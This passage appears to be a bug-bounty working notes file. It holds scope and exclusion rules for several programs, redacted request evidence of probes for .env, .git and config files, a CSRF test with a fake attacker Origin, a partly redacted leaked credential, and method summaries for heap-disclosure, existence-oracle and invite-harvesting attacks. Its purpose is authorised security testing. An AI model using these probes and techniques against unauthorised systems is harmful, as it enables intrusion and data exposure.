HTTP/1.1 200 OK
Server: Apache
Content-Length: 3954
Content-Type: text/html; charset=UTF-8

/log/
#/config/
#/metadata/
#/cert/
/envvars/
...
```

## [Bugbountyskills.md] Evidence (redacted)

```http
GET /envvars/global.php HTTP/1.1
Host: bgp.frontier.com

HTTP/1.1 200 OK
Server: Apache
Content-Length: 0
Content-Type: text/html; charset=UTF-8

GET /.config.php HTTP/1.1
Host: bgp.frontier.com

HTTP/1.1 200 OK
Server: Apache
Content-Length: 0
```
Behavior matrix: GET/POST, `?debug=1 ?dump=1 ?format=json ?output=1`, `X-Debug: 1` →
always 200/0. No backup variants exist (`*.bak/*.old/*.swp/*.txt/~` → 404;
`*.phps` → generic 403 extension rule).

## [Bugbountyskills.md] Scope

- In scope: `http://fv.getoutlaw.com/` (Web Application, production) — the only asset listed In Scope.
- Out of scope / exclusions (program-specific):
  - Broken Access Control relying on WebSocket connections or overly permissive WebSocket information disclosure
  - MITM / physical access attacks; any 3rd party outside the program's domain spaces
  - Arbitrary file upload **without** proof/evidence of the uploaded file
  - DoS / DDoS including Rate Limiting disruption
  - Broken Link Hijacking; Blind SSRF without negative impact; Clickjacking/Tapjacking
  - CVEs published <90 days; CVEs without PoC; CORS misconfig on non-sensitive endpoints or without negative impact
- **MANDATORY header on ALL requests:** `X-Inspectiv-Tester: hasansec+3@wearehackerone.com` (operator's email = username; confirmed by operator 2026-10-23). **Browser caveat:** send this header ONLY to getoutlaw.com hosts — sending it cross-origin (identitytoolkit.googleapis.com) breaks Google's CORS preflight (403) and Firebase login fails with `auth/network-request-failed`. Route-scope the header in Playwright (`ctx.route`).
- Authenticated testing: credentials at `~/.config/bughunter/getoutlaw-credentials.env` (mode 600; never copy into this profile). Firebase login OK — test account is **standard (non-admin)**; admin endpoints (`/users/search`, `/teams/search`, `/tools/inspect-url`) return "Admin access required". Tokens live ephemerally in `/tmp/opencode/fv/tokens.env`.
- Record hygiene: **no mass create/delete/change of records.** Own test records go in the *second organization* if applicable.
- **Cross-account access = STOP immediately and report.** Do not continue probing once another account's data is reachable.
- Rate limits & testing windows: unspecified — be conservative (rate limiting itself is out of scope, so bursts look like DoS).

## [Bugbountyskills.md] Evidence (all requests carry the mandatory `X-Inspectiv-Tester` header)

1. **Anon == authed, byte-identical** — own test deal `-P4dmjEwbkh0G0rnv2SH`:
   - No `Authorization` header → `HTTP 200`, 716 bytes (`/tmp/opencode/fv/gb-anon-final.json`, headers in `gb-anon-headers.txt`; identical to first capture `gb-anon.json`).
   - With valid Bearer token → `HTTP 200`, 716 bytes, `cmp` byte-identical (`gb-auth.json`).
   - Response headers: `content-type: application/json`, `x-content-type-options: nosniff`, `cf-cache-status: DYNAMIC` (not cacheable — read is live).
2. **Second object, also anon** — template deal `-P4dmfQi8uSu0tXbKIEG` (obtained from my own deal's `sourceTemplateDealID` field, not enumerated) → `HTTP 200`, 491 bytes, full bundle.
3. **Existence oracle control** — `{"dealID":"ffffffffffffffffffffff"}` (guaranteed nonexistent) anon → `HTTP 404 {"error":"Document not found."}`. So the endpoint distinguishes existent/nonexistent deals for an unauthenticated caller.

## [Bugbountyskills.md] Evidence files

- `/tmp/opencode/fv/gb-anon.json`, `gb-anon-final.json`, `gb-anon-headers.txt` — anonymous 200 captures
- `/tmp/opencode/fv/gb-auth.json` — authenticated 200 (byte-identical proof)
- `/tmp/opencode/fv/gb-tmpl.json` — second object (template deal) anonymous 200

## [Bugbountyskills.md] Scope

- In scope: **Devolutions Cloud** (cloud password manager for teams) — `hub.devolutions.com`
  verified as the Cloud app (`<title>Devolutions Cloud</title>`). Likely Cloud-adjacent hosts:
  `login.devolutions.com`, `login.devolutions.xyz` (identity), API hosts TBD from JS bundles.
  Also in scope: **Devolutions Crypto** open-source crypto library (GitHub review).
- Out of scope / exclusions:
  - Third-party crypto primitives (Devolutions Crypto section).
  - Third-party infrastructure: Cloudflare edge IPs (172.65.90.4-7 are Cloudflare anycast —
    scanning them = scanning Cloudflare, NOT Devolutions), Azure Blob hosts
    (`*.blob.core.windows.net`), Google/Gravatar, Outlook mail protection.
  - **Real customers' data — MUST NOT be read, altered, or impacted.** The operator's pasted
    scope says the trial environment is PRODUCTION: "real customers could be impacted by the
    tests, so we ask to be careful."
  - Conservative defaults (pasted guideline was truncated before the full testing-policy
    list): no DoS/service degradation, no brute-force/credential stuffing, no account
    enumeration against real users, no social engineering.
- Permitted explicitly: creating **multiple trial accounts** to test data segregation and
  access controls (relevant for a future authenticated session).
- Rate limits & testing windows: none stated in paste — be conservative: small bursts,
  back off on 429/WAF signals, throttle scanners.

## [Bugbountyskills.md] Bounding rules carried from program scope

- Real customers could be impacted → NO data exfiltration of real tenants; only prove at
  marker/boolean depth. Third-party infra (Cloudflare edge IPs, Azure Blob, mindinabox
  telemetry cluster) is OUT of scope — do not authenticate to the leaked OpenSearch cluster.
- Conservative defaults (pasted guideline truncated): no DoS, no brute-force, no account enum
  against real users.

## [Bugbountyskills.md] Evidence

- Raw response: `evidence/recon/server-configurations.json` (operator-only; contains the live
  password).
- Redacted copy for the report: `evidence/server-config-redacted.json` (`password` replaced
  with `[REDACTED-IN-EVIDENCE]`).
- Response headers confirm no auth and no CORS exposure: `evidence/recon/server-config.headers`
  (`cf-cache-status: DYNAMIC`, no `access-control-*`, `x-envoy-upstream-service-time`).

## [Bugbountyskills.md] Evidence

- `evidence/recon/main.js.map` (truncated on disk; live size 62,083,575 B)
- `evidence/recon/embedded-source.ts` (42,162,350 B reconstructed source)
- `evidence/recon/api-endpoints.txt` (161 routes mined from main.js)
- Uniformity check: `common.js.map → 2292 B (soft-404)`, `polyfills.js.map → 418,293 B`,
  `scripts.js.map → 92,799 B` — only some bundles leak.

## [Bugbountyskills.md] Bounding / triage note

- No `eval`/`Function`/`child_process` execution sinks or hardcoded cloud keys were found in the
  reconstructed source (the apparent `AKIA…`/`AIza…` hits are base64 from the embedded
  Devolutions Crypto WASM, not real keys). Two `bypassSecurityTrustHtml` usages exist
  (`SafeHtmlPipe`, `MarkdownPipe`) but are generic pipes — exploitability depends on whether
  user-controlled data reaches them, which requires the authenticated app (next session).

## [Bugbountyskills.md] Evidence (redacted)

- Bootstrap response: `evidence/recon/server-configurations.json` (operator-only, contains the
  live value) and the redacted copy `evidence/server-config-redacted.json`.
- Redacted secret forms for the report:
  - Username `prodhub`
  - Password `cda•••••••••••••@•••` (redacted; full value retained only in operator-only evidence)
  - Cluster `https://telemetry2.devolutions.net:9200`
- Response headers: `evidence/recon/server-config.headers` — `HTTP/2 200`,
  `content-type: application/json; charset=utf-8`, `cf-cache-status: DYNAMIC`, no
  `access-control-*`, `x-envoy-upstream-service-time: 2`. Confirms no auth and no CORS exposure.
- Validation probes (2026-10-25): `403 security_exception` on `_cluster/health`,
  `_cat/indices`, `_cat/plugins`, `_nodes`, each echoing `User [name=prodhub, backend_roles=[]]`.

## [Bugbountyskills.md] Scope note

`telemetry2.devolutions.net` is a Devolutions-owned domain (CNAME → hoster
`devolutions.mindinabox.ai`) and is the Devolutions Cloud telemetry backend, i.e. in-scope attack
surface for the Cloud product. Validation was limited to identity and capability probes — no
brute-force, no index reads, no writes — consistent with the program's note that the trial
environment is production and real customers could be impacted.

## [Bugbountyskills.md] Scope

- In scope (confirmed): `https://www.jardindacclimatation.fr/` — the asset the operator named.
- Inferred in-scope: the registrable domain `jardindacclimatation.fr` (apex serves a bare nginx,
  not the app — see Attack surface).
- **Out of scope / unconfirmed: ALL subdomains.** 24 subdomains exist in CT logs including
  `preprod`, `int`, `pp`, `pp-api-ticket-v9/v10/v11`, `gtm-origin`, `octime`.
  These look like staging/integration infrastructure. **Do not actively test them until the
  operator pastes the program's explicit scope list.** Passive CT/DNS recon only.
- **Binding constraints taken from the program brief (treat as rules, not advice):**
  - **No PII in the report. REDACT/OBFUSCATE all PII in PoCs** (screenshots, responses, JSON).
  - **For a sensitive-information leak: DO NOT extract/copy every exposed document or record.
    Limit yourself to DESCRIBING AND LISTING what is exposed.** This caps proof depth for the
    known PII leak — describe the class and shape of data, do not harvest records.
  - Do not alter compromised accounts (no create/delete/modify of data).
  - Do not use compromised accounts to hunt post-auth bugs (not eligible anyway).
  - Exposed credentials/secrets: verify validity only, do not exercise.
  - Report needs: textual description, exploitability, impact, remediation, screenshots with
    PII redacted, complete repro steps.
- Rate limits / testing windows: **unspecified — be conservative.** Akamai Bot Manager throttles
  hard anyway (see WAF section); there is effectively a built-in ~1 request/burst limit.
- Assume standard exclusions not yet read: no DoS, no social engineering, no spam/email bombing,
  no destructive actions, no real payment execution.

## [Bugbountyskills.md] Info disclosure (`info-disclosure-testing`)

| Target | Signal | Status |
|---|---|---|
| **`?token=<oktaToken>` on every `/admin/*` route** | auth token in query string → Referer to 3rd parties, access logs, browser history | **Static-confirmed** (reportable on its own) |
| `_buildManifest.js` + 41 chunks | full route/param/auth inventory | **Harvested** |
| Sourcemaps `*.js.map` | original source | 403 for bots — retest with validated `_abck` |
| `GET /api/auth/providers`, `/api/auth/session` | next-auth config disclosure | 403 edge (bot gate, not proof of absence) |
| `/.env`, `/composer.json`, `/graphql`, `/wp-login.php` | classic | 403 edge — **Ruled out as unreachable, not as nonexistent** |
| 401 body `{"message":"Unauthorized","statusCode":401}` | uniform, no stack trace | **Ruled out** (no verbose errors seen) |

## [Bugbountyskills.md] Evidence

Raw request/response pairs: `evidence/checkEmail-*.txt` (redacted — no third-party addresses used;
all test addresses are fabricated placeholders).

## [Bugbountyskills.md] Scope

- In scope: `https://*.quizlet.com` (Cloudflare-fronted), 3.0 API, Quizlet iOS app, Quizlet Android app.
- Out of scope / exclusions:
  - `api.quizlet.com/2.0` (explicit)
  - `help.quizlet.com` (Zendesk, explicit)
  - `get.quizlet.com` (explicit)
  - slader.com (explicit, since 2025-01-14)
  - **Any Quizlet property not listed in targets** — anything outside `*.quizlet.com` + the listed app/API assets.
  - Rate limiting, scraping of publicly available content, automation concerns — out of scope *unless* premium-content access or significant security impact. **Consequence: Cloudflare challenge/WAF bypass alone is NOT reportable here.**
  - Cheating mechanisms in gaming/testing features, academic-dishonesty manipulation — explicitly not in scope.
  - Never: DoS, payment flows, real user data beyond minimum redacted proof.
- Rate limits & testing windows: unspecified on program page. `study.quizlet.com` advertises `x-ratelimit-limit: 500` (per minute) in headers — stay well under it; small bursts, back off on 429/WAF tripwires.
- Note: `api.quizlet.com/2.0` excluded but **3.0 API** is a listed in-scope target → `api.quizlet.com/3.0` in scope, `2.0` out.
- Scope-hygiene note: `help.quizlet.com` (302) and `get.quizlet.com` (200) were touched **once each** purely to classify reachability; they are out of scope and will not be tested.

## [Bugbountyskills.md] Scope

⚠️ **The program's hard rule (quoted):** *"You must use our sandbox environment for all
testing… If you perform unauthorized testing in our production environment NOT your
accounts will suspended and your reports rejected."*

- **In scope:** `sandbox.reready.co` (http/https) — "No approvals are required, and sandbox
  accounts are free… identical to production except:" sandbox **WILL** send emails, will
  **NOT** send texts / process payments / create shipping labels / trigger fulfillments.
  AI-agent testing explicitly welcomed ("responsible and does not degrade our environment").
- **Out of scope:** `www.reready.co` + `reready.co` production — testing there = account
  suspension + report rejection. Read-only public-page browsing of production for scope intel
  only; **no active probing, no payload requests against production.**
- Also out of scope by policy: DoS/degradation of any kind (no fuzz floods, no large-body
  tests), third-party hosts (Stripe, Google, LinkedIn, Zendesk…) — report-chain only.
- **No bounty for:** re-reports within 5 business days, P5 email-exposure, expected behavior
  (password re-use allowed, ordinary users managing payment methods/addresses/orders).
- **Bounties:** P1 $1,000 / P2 $500 / P3 $200 / **P4 $0 / P5 $0 since 2026-10-23**
  → P4/P5 findings = findings, but no payout; prioritize P3+.
- Rate limits & testing windows: unspecified — be conservative (policy says "does not degrade
  our environment"). Small bursts, back off on 429/403 patterns.

Note: the literal host `www.reready.co.test` in the original request is **NXDOMAIN** — it was
a garbled parse of `reready.co` + "test …" prose. Verified 2026-10-25.

## [Bugbountyskills.md] 0. Scope gate

```
$ getent hosts www.reready.co.test     -> exit 2 (NXDOMAIN)
$ nslookup www.reready.co.test         -> "** server can't find www.reready.co.test: NXDOMAIN"
$ getent ahosts reready.co / www.reready.co -> 165.227.223.207 (production)
$ getent ahosts sandbox.reready.co     -> 165.227.99.141 (authorized)
GET https://www.reready.co/help/vulnerability-bug-bounty-program   (policy, read-only)
  "You must use our sandbox environment for all testing. No approvals are required…"
  "If you perform unauthorized testing in our production environment NOT your accounts
   will suspended and your reports rejected."
GET https://www.reready.co/help/is-there-a-sandbox-environment
  "You can open your own sandbox account at http://sandbox.reready.co"
  sandbox: WILL send emails; will NOT send texts / payments / shipping labels / fulfillments
```

## [Bugbountyskills.md] 8. Info disclosure probes

```
/sitemap.xml                200  5055 B  (26 URLs — all production marketing pages)
/robots.txt                 404 nginx-bare
/.well-known/security.txt   404 app-rendered      /{change,assetlinks,gpc}.txt|json 404
/.git/HEAD  /.git/config  /.env  /.svn/entries  /.DS_Store  /backup.sql  /dump.sql  -> 404 (7790 B)
/assets/*.css.map  *.js.map  application.js.map -> 404 / 429 (never a map)
/rails/info/routes  /sidekiq  /cable  /admin  /actuator/health  /package.json -> 404
/assets/  -> 404 (no directory listing)     /favicon.ico -> 200 but Content-Length: 0
Uniform 404 body size 7790 B across ALL missing paths (existence oracle is flat — no
hidden-path detection possible by size). No stack traces from malformed input.
```

## [Bugbountyskills.md] Scope

**Registrable domains with a wildcard in scope (all Tier 4, blackbox/self-signup only):**
`*.verizon.com`, `*.verizonwireless.com`, `*.verizonbusiness.com`, `*.verizonenterprise.com`,
`*.verizon.net`, `*.vzw.com`, `*.vzbi.com`, `*.vzwcorp.com`, `*.onetalk.com`, `*.fios.tv`,
`*.tracfone.com`, `*.straighttalk.com`, `*.totalwireless.com`, `*.safelinkwireless.com`,
`*.pagepluscellular.com`, `*.simplemobile.com`, `*.net10wireless.com`, `*.myfamilymobile.com`,
`*.visible.com`, `*.vzconnect.com`, `*.telogis.com`, `*.fleetmatics.com`, `*.vespm.com`,
`*.mblogin.verizonwireless.com`, `*.odi-device.verizonwireless.com`, plus `gosmartmobile.com`,
`1010987.com`, `empirecitysubway.com`, `omniroot.com` hosts.

**Tier 4 named hosts (highest-value, tractable):** www.verizon.com, www22.verizon.com,
enterpriseportal.verizon.com, tv.verizon.com, activate.verizon.com, api.verizon.com,
ondevice.verizon.com, experience.verizon.com, partnerportal.verizon.com, legalintake.verizon.com,
mycareer.verizon.com, teamindia.verizon.com, thingspace.verizon.com, core.thingspace.verizon.com,
thingspaceportal.verizon.com, webexcallingus.verizon.com/control/main,
autochatva.verizon.com/cv/cbav/#/virtualassistant, noaccess.verizon.com/bwg/,
cms-cmsgax.verizon.com/gax/, cms-cmspulse.verizon.com/pulse/,
login.lighting.verizon.com, verizonmdm.vzw.com, lifeonverizon.verizonwireless.com,
cim.verizonwireless.com, roms.verizonwireless.com, indirectorders.verizonwireless.com,
wbbc.verizonbusiness.com, e-meetings.verizonbusiness.com, mss-sso.verizonbusiness.com/sso/login,
conferencing.verizonbusiness.com, performancereporting.verizonbusiness.com,
plnr.verizonbusiness.com, dnr.emea.verizonbusiness.com,
cmsvoicecallback.verizonenterprise.com, gridwideportal.verizonenterprise.com,
login.platform.telogis.com, wanaka.telogis.com, rhino.it-fleetmatics.com,
work2.fleetmatics.com/Admin/Default.aspx, login.us.vzconnect.com, reg.mci.com/service,
cloud.iboss.com, crl.a.mcs.omniroot.com, cadmin.a.mcs.omniroot.com/user/dashboard.
Mobile apps also in scope (MyVerizon, Care Smart, plusHome, HUM, Protect, etc.).

**Out of scope / exclusions — PROHIBITED (do not send a packet):**
- sitemail.webhosting.verizon.net, sitecontrol.webhosting.verizon.net,
  order.domains.verizon.net, reports.webhosting.verizon.net
- myverizonenterprise.verizon.com (pulled 2026-09-25), vzretailsupport.com/*
- wits3portal.verizon.com, wits3app.verizon.com, sao.verizon.com, saocentral.verizon.com
- eis.verizongov.com, federaleis.verizongov.com, federalextauth.verizongov.com,
  verizongov.com (whole wildcard removed), NetworxEnterprise.verizon.com,
  networxuniversal.verizon.com
- mss-60.verizonbusiness.com, mss-fed-sso.verizonbusiness.com, mss-54.verizonbusiness.com
- Apogee-mt.ops.cybertrust.com
- www.movildata.com

**Out of scope — vulnerability classes / specific known bugs:**
- RXSS on `*.verizon.com/SpeedTest/learnSpeedTest.aspx?bypassSpeed=`
- Broken Access Control on `www.verizon.com/externalportal/api/*`
- HTMLi + RXSS via template-engine params on `extras.tracfone.com/en/*`,
  `extras.totalwireless.com/en/*`, `extras.pagespluscellular.com/en/*` (all language variants)
- XSS/HTMLi on the Upland PostUp/StormPost email platform (click1., email., anything serving
  `/Subscribe.do`, all assets) — this is the big one to avoid, MX/email click trackers are everywhere
- RXSS from unsanitised `ga` function at mysite.tracfone.com; RXSS at g.tracfone.com
- SQLi on webview.email2.tracfone.com; Support ticket exposure at enterpriseportal.verizon.com
- Domain mys.tracfone.com
- RXSS on www22.verizon.com/wholesale/*
- Generic no-pay: clickjacking/tapjacking, CORS on non-sensitive endpoints, CSRF with no impact
  (or on anonymous forms/logout), CSV injection, rate-limit/brute-force, self-XSS,
  banner/version/stack-trace disclosure, missing security headers, OPTIONS/TRACE,
  open S3 listing of public files, SPF/DKIM/DMARC, SSL config, token expiry, user enum,
  session issues without demonstrated impact, weak captcha, WP XMLRPC, blind SSRF w/o impact,
  host-header injection w/o impact, request smuggling w/o impact, broken-link hijacking,
  IP loggers, autocomplete/password-manager, MITM/physical, social engineering,
  CVEs <90 days old or without PoC, "violation of secure design principles".
- **Subdomain takeover IS in scope but needs a live PoC.**

**Rate limits & testing windows:** no stated window. Code of conduct caps traffic — do not exceed
10 req/sec and do not sustain for >10 seconds. No mass record creation/deletion. Do not use
leaked credentials. Do not contact support for accounts. Stop immediately on cross-account access.

## [Bugbountyskills.md] Scope

- **In scope (12 targets):** `https://www.vinted.com`, `https://www.vinted.net`, `https://www.vintedgo.com`,
  `https://sandbox.vinted.com`, `https://sandbox.vintedgo.com`, `https://test-escalations.vintedgo.com`,
  `https://badger.it.vinted.com`, `https://careers.vinted.com`, `https://company.vinted.com`,
  `https://news.vinted.com`, iOS app `id632064380`, Android app `fr.vinted`
- **Program rule:** *"Testing is only authorised on the targets listed as in scope."* Any unlisted
  Vinted property is out of scope — **including `*.vinted.fr/.de/.uk/...` (other locales), `api.vinted.com`
  / `fr.core.api.vinted.com` (seen in JWT `aud`), and `marketplace-web-assets.vinted.com` (asset host).**
- **Exclusions / rate limits: UNKNOWN — full brief is behind Bugcrowd login.** Confirm before
  authenticated or automated-heavy testing. Targets are confirmed; exclusions are not.
- **Site-declared restrictions (`/robots.txt`), treat as binding:**
  - `User-agent: ClaudeBot / GPTBot / Google-Extended / Amazonbot / CCBot → Disallow: /`
  - AI agents may **not** create/register/manage accounts, add to cart, purchase, checkout, pay,
    or simulate customer interaction — "Any automated transactional behavior is considered unauthorized."
  - `ai-train=no`, `ai-input=no` for the AI-crawler block; content is being read here purely for
    authorized security testing, never scraped/trained on.
  - Practical consequence: **no automated registration, no cart/checkout/payment flows, low request
    volume, targeted requests only.** Authenticated testing ⇒ user's own account, manual, or on
    the in-scope `sandbox.vinted.com`.

## [Bugbountyskills.md] Evidence (2026-10-21)

Full dump: `evidence/root-headers-2026-10-21.txt`

Present:
```
strict-transport-security: max-age=300
```

Absent (checked across full header block):
```
content-security-policy / content-security-policy-report-only
x-frame-options
x-content-type-options
referrer-policy
permissions-policy
cross-origin-opener-policy / cross-origin-resource-policy
```

Related cookie-flags observation (same response):
```
set-cookie: anon_id=...; Path=/; ...            (no Secure, no HttpOnly)
set-cookie: anonymous-iso-locale=...             (no Secure)
set-cookie: non_dot_com_www_domain_cookie_buster=... (no Secure)
```
(`access_token_web` / `refresh_token_web` are correctly `HttpOnly; Secure; SameSite=Lax`.)

## [Bugbountyskills.md] Evidence (2026-10-21) — four independent sources, one value

| Source | Token observed |
|---|---|
| Account A request header (captured by operator, Bangladesh IP) | `75f6c9fa-dc8e-4e52-a000-e09dd4084b3e` |
| Account A authenticated HTML (`"CSRF_TOKEN":"..."` runtime config) | same |
| Account B authenticated HTML (different account/session) | same |
| Anonymous cookie-less `GET /` (tester's IP, Chicago edge) | same |

⇒ Not session-bound, not account-bound, not IP-bound. Constant deployment-wide.

Token presence **and** value are enforced (correctness checks that passed):
- No `X-Csrf-Token` header → `403 {"code":106,"message":"Accès refusé"}`
- Fabricated value `00000000-0000-0000-0000-000000000000` → `403`
- Correct value → `200`

`Origin`/`Referer` **not** validated:
- Valid token + `Origin: https://evil-example.test` + `Referer: https://evil-example.test/...` → **`200`**, upload executed
- Valid token + no `Origin` header → **`200`**

Tunnelling blocked (header-only acceptance):
| Vector attempted | Result |
|---|---|
| token as form field `_csrf_token`/`authenticity_token` | `403` |
| token as query params `_csrf_token`/`csrf_token` | `403` |
| `X-Requested-With: XMLHttpRequest` instead of token | `403` |

## [Bugbountyskills.md] Why severity is Low, not Critical

A browser-based attacker knowing the constant token still cannot land the request:
1. The token is accepted only in a **custom header** → cross-origin `fetch` triggers CORS
   preflight → no `Access-Control-Allow-*` is ever returned (verified) → browser blocks.
2. HTML forms cannot set custom headers → `403`.
3. Auth cookies (`access_token_web`, `_vinted_fr_session`) are **`SameSite=Lax`** → a cross-site
   POST would not carry them anyway.
`Origin` non-validation is therefore defence-in-depth that happens to be missing, not a
standalone break.

## [Bugbountyskills.md] Ready to run once scope is set (Phase B, passive)

- subfinder + assetfinder -> recon/subdomains/
- dnsx resolve -> httpx probe live hosts -> recon/live-hosts/
- gau + waybackurls (passive historical URLs) -> recon/urls/
- Parse scope into scope/program-scope.md + scope/exclusions.md, build validation checklist.

## [Bugbountyskills.md] >> scope/exclusions.md

*Source: `/root/bugbounty-lab/scope/exclusions.md`*

## [Bugbountyskills.md] >> scope/program-scope.md

*Source: `/root/bugbounty-lab/scope/program-scope.md`*

### [Bugbountyskills.md] 17.66 Two-parser header case-sensitivity mismatch: `Content-Length: N` + `content-length: 0` → allocated-but-unfilled buffer written to disk → uninitialized-heap disclosure (Valve CS:GO download path #1070835, bug #1)

SOURCE: https://hackerone.com/reports/1070835 — Valve, "CS:GO Server -> Client RCE through OOB access in CSVCMsg_SplitScreen + Info leak in HTTP download" (Critical 9.6; reporter simonscannell)  read 2026-11-07 (body NOT in `.json` `vulnerability_information` — read from the PUBLIC researcher summary returned by the same endpoint)
CLASS: parser-differential / uninitialized memory disclosure · CWE-457 → CWE-200
CORE METHOD:
  1. The app parses HTTP headers ITSELF (header callback allocates from `Content-Length` via a case-SENSITIVE search) while the HTTP library (curl) matches header names case-INSENSITIVELY and frames the body.
  2. Serve `HTTP/1.1 200 OK` / `Content-Type: text/html` / `Content-Length: 1337` / `content-length: 0` / `Connection: closed` → the app allocates 1337 bytes, curl delivers NO body, the app still writes the whole buffer to the destination file = 1337 bytes of uninitialized heap.
  3. Exfiltrate via the protocol's own file-upload message (`NETMsg_File`) → remote heap read.
  4. Deterministic ASLR break: spray `CSVCMsg_SendTable` 256× with `sendprop_t` objects carrying unique markers (`type = 0x1337ee00`, `num_bits = 0x00ff00ff`), then collect uninit files of the same size and scan for the markers → `engine_base = vtable_ptr - OFFSET_VTABLE` (~98/100).
DETECTION SIGNAL: a component that parses or re-parses HTTP headers itself (downloaders, importers, WAF-bypass proxies, scrapers, mobile BFFs, log ingest) — look for a case-sensitive `strstr`/`find("Content-Length")`; duplicate/mixed-case framing headers accepted without rejection; a store/forward step that never compares allocated size with bytes received.
CHAIN: attacker-controlled server → mixed-case duplicate `Content-Length` → buffer allocated, never filled, written to disk and uploaded back → heap memory leaked → module base recovered → combined with an OOB write/read primitive to full RCE (see 17.67 in the same report).
TRANSFERABLE TEST: drive the target's own preview/import/download route while serving `Content-Length: 4096` + `content-length: 0` (both orders, and `Content-Length` vs `Content-length`); if the stored artefact is larger than the delivered body or contains pointers/paths/other users' strings, the buffer is uninitialized memory. Then ask the same question of every importer: are received bytes counted and validated before persistence?

### [Bugbountyskills.md] 17.144 A per-user COUNTER that ticks only on a valid reference is an EXISTENCE ORACLE — a write/link mutation against an arbitrary handle plus a publicly visible aggregate ("N Bugs found") discloses PRIVATE programs the caller cannot read

CLASS/METHOD: the publish-report flow is backed by the `createExternalReport` GraphQL mutation, callable by any user with ANY handle (`input_0 = {handle, title, vulnerability_information, hacker_summary, reported_date, resolved_date, attachment_ids, clientMutationId}`). The public profile prints the resulting count ("<N> Bugs found"). Fire the mutation against a candidate handle, re-load the profile: the counter increments ONLY when the handle resolves to a real program — private/sandbox ones included, because the counter counts reports created in the sandbox that the profile does not otherwise show. Sweep `@cisco`, `@apache`, `█████████` and watch 130 → 131 to prove a private program exists.
DETECTION SIGNAL: a publicly readable per-user aggregate (report count, credits, contributions, followers) that updates on a mutation against an identifier you do not own; a create/publish/link/follow mutation accepting any external handle/slug/username; a counter that counts sandbox/private-scope items but displays them without the scope; introspection exposing a mutation whose input is someone else's `handle`.
CHAIN: any user calls the write mutation (primitive) → the mutation's effect lands in a PUBLIC per-user aggregate → the aggregate moves ONLY for handles that resolve → enumerate existence of private programs/tenants/objects (the reporter's stated impact: "disclosure of external programs with private"). Value is the ENUMERATION method, not the info-disclosure rating — hold it as the first link of a recon chain (§2).
TRANSFERABLE TEST: find a write/link/create/follow mutation taking an identifier you do not own AND a publicly readable counter. Snapshot the counter, fire the mutation at a candidate identifier, re-read: +1 proves the identifier EXISTS even when its object is private. Sweep identifiers into an existence map; also try a mutation that DECREMENTS/CONSUMES and the response length/timing as parallel oracles.
WHY IT IS A NEW GENERAL METHOD: §17's existence/oracle entries are content readers (diff/merge-preview second-reference IDOR, token oracles in preview/dry-run endpoints, normalization mismatch in §17.38's anti-abuse counter). None records a WRITE mutation's side effect on a PUBLIC AGGREGATE as the oracle — a "counter that only ticks on a valid reference" enumerates resources whose contents you can never read.

### [Bugbountyskills.md] 17.168 Two features that each MINT access grant unlimited access when composed: an automated onboarding path turns an outbound message into a private-program invitation, and the churn incentive mints a FRESH invitation on exit (HackerOne `security@` forwarding + Leave-Program fast-track, #334205)

SOURCE: https://hackerone.com/reports/334205 — HackerOne platform, "Harvesting all private invites using leave program fast-tracked invitation and security@ email forwarding feature" (Business Logic Errors, CWE-840; Medium 6.1; $2,500; reporter japz)  read 2026-11-07 via the `.json` endpoint (full body, 2,370 B) + the reporter's writeup
CLASS: business-logic access-minting LOOP (unbounded privilege/access grant manufactured from legitimate features) · CWE-840
CORE METHOD:
  1. Find the MINTING feature: programs with `security@` EMAIL FORWARDING enabled are detectable by outbound mail alone — "go to https://hackerone.com/bug-bounty-programs, click all the program and send a test email to their declared security at email on their public page, if you received a response to submit your bug, then that means security@ is activated".
  2. Trigger it: send a mail to the program's forwarding address (`security@company.com`) ⇒ the PLATFORM (not the program owner) mints and emails an invitation to that private program, with a "Submit Vulnerability" link. No entitlement check, no interaction with the owner.
  3. Consume it (click through) ⇒ participant of a private, non-publicly-listed program.
  4. Find the SECOND minting feature and loop: LEAVE the program and complete the leave survey ⇒ the platform FAST-TRACKS the account for new invites ("most likely arriving in the next 24 hours"); the fresh invitation arrives with no new entitlement. Reporter's exploit line: "just send an email to: <program> > get invites > leave to <program> > get new invites came from fast-tracked > repeat".
  5. Scale it: "in a matter of few months you can have 100+ private invitation by just daily repeating the steps" — the loop has no per-account or per-period bound.
DETECTION SIGNAL: a PRIVILEGE-CONFERRING grant (invitation, seat, membership, trial, API key, credit) minted by a trigger the user need not be entitled to — an outbound mail to a ROLE address, a public contact/support/partner form, a published invite or share link, an SSO/partner handshake — PAIRED with any retention/churn incentive that mints a NEW grant on exit or reversal (fast-track invites, win-back credit, re-join bonus, referral payout, cancel-then-repurchase, downgrade-then-upgrade). Tell: the grant-creating and grant-issuing code paths are independent; the churn path never checks "this account has just left / has already been fast-tracked N times".
CHAIN: unauth-able trigger (send one mail to `security@<program>`) → platform converts it into private-program ACCESS (primitive: automated onboarding with no entitlement check) → the leave-program incentive mints ANOTHER access grant on exit (primitive: retention logic treats churn as a reason to grant) → loop → the attacker accumulates private-program membership, reaching those programs' non-public scope, forms and opportunities at scale (Medium 6.1 here; the P1/P2 rating must come from the value of the gated assets, with preconditions and gain stated first, doctrine §4/§8). The same shape applied to MONETARY grants (coupon, credit, refund) is a direct revenue loop.
TRANSFERABLE TEST: for every "feature that mints access", write down its trigger and its entitlement check; then pair each minting feature with every OTHER state-changing feature that also mints (join/leave, cancel/refund, downgrade/upgrade, deactivate/reactivate, referral, win-back) and drive the loop BY HAND: mint grant #1 → consume it → perform the churn/reversal action → observe whether grant #2 arrives with no new entitlement. Count grants over N cycles against the documented per-account and per-period limits; if the count grows without a stated bound, the access model is an open loop.
WHY IT IS A NEW GENERAL METHOD: §17.60 / #807448 and this file's invite material record HARVESTING an existing invitation TOKEN (GraphQL over-exposure → token → PII); nothing records a loop that MANUFACTURES grants from two legitimate features, where the attacker never needs a leaked token. Reusable rule: **access-minting features compose — one feature that grants on an inbound trigger plus one that grants on churn is an unbounded access faucet; enumerate every minting feature, then drive the loop by hand and count the grants.** Slot 17.168.

### [Bugbountyskills.md] 17.192 A security fix scoped to ONE parameter-SUPPLY PATH — the per-call argument was patched, the class-level/global config was not, so the identical bypass still works on the PATCHED version (Rails::Html allow-list, CVE-2022-23520 / CVE-2022-32209, HackerOne #1805893)

SOURCE: https://hackerone.com/reports/1805893 — Internet Bug Bounty, "CVE-2022-23520: Incomplete fix for CVE-2022-32209 (XSS in Rails::Html::Sanitizer under certain configurations)"  read 2026-11-08 (`visibility: full`, `curl .../1805893.json`; body quotes its own source report #1654310 and links the fix commit).
CLASS: XSS via an INCOMPLETE FIX — a filter whose parameter can be supplied through several mechanisms, where the patch covers only one of them.
